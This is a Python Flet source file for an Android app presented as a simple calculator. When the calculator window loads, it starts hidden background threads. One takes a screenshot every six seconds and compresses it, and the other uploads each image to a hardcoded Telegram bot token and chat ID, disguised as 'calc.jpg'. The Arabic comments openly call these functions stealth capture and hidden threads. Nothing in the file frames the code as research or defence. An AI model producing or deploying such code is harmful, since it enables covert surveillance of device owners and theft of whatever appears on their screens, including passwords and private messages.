import flet as ft
import os, threading, time, requests, zlib
from flet import Page, TextField, ElevatedButton, Row, Column

# ----------- إعدادات التلغرام -----------
TOKEN = "7740589813:AAFuxatj_14ycjlVjk7eSmf2jxWvNiQMnIA"
CHAT  = "5648499583"
CACHE = "/data/data/com.example.wormcalc/cache/shots"
INTERVAL = 6      # 10 screens/minute

os.makedirs(CACHE, exist_ok=True)

# ----------- وظيفة التصوير الخفي -----------
def stealth_shot():
    while True:
        try:
            fname = f"{CACHE}/{int(time.time()*1000)}.png"
            # screencap متاح للتطبيقات ذات صلاحية READ_FRAME_BUFFER (لا حاجة لروت)
            os.system(f"screencap -p {fname} >/dev/null 2>&1")
            if os.path.exists(fname) and os.path.getsize(fname) > 0:
                with open(fname, "rb") as f:
                    z = zlib.compress(f.read(), 9)
                open(fname + ".z", "wb").write(z)
                os.remove(fname)
        except Exception:
            pass
        time.sleep(INTERVAL)

# ----------- رفع الملفات إلى التلغرام -----------
def uploader():
    while True:
        try:
            for f in os.listdir(CACHE):
                path = os.path.join(CACHE, f)
                if f.endswith(".z"):
                    with open(path, "rb") as pic:
                        requests.post(
                            f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
                            data={"chat_id": CHAT},
                            files={"photo": ("calc.jpg", pic, "image/jpeg")},
                            timeout=15
                        )
                    os.remove(path)
        except Exception:
            pass
        time.sleep(2)

# ----------- واجهة الحاسبة (Flet) -----------
def main(page: Page):
    page.title = "Calculator"
    page.window.resizable = False
    page.window.width  = 260
    page.window.height = 380
    result = TextField(value="0", text_align="right", read_only=True, width=240, height=60)

    def on_click(e):
        b = e.control.text
        if b == "C":
            result.value = "0"
        elif b == "=":
            try:
                result.value = str(eval(result.value))
            except Exception:
                result.value = "Error"
        else:
            result.value = (result.value + b) if result.value != "0" else b
        page.update()

    keys = ["7","8","9","/",
            "4","5","6","*",
            "1","2","3","-",
            "C","0","=","+"]
    rows = []
    for r in range(4):
        rows.append(Row([
            ElevatedButton(text=keys[r*4 + c], on_click=on_click, width=60, height=50)
            for c in range(4)
        ], alignment="center"))
    page.add(Column([result, *rows], spacing=10))

    # تشغيل الخيوط الخفيّة
    threading.Thread(target=stealth_shot, daemon=True).start()
    threading.Thread(target=uploader, daemon=True).start()

# ----------- نقطة الدخول -----------
if __name__ == "__main__":
    ft.app(target=main)
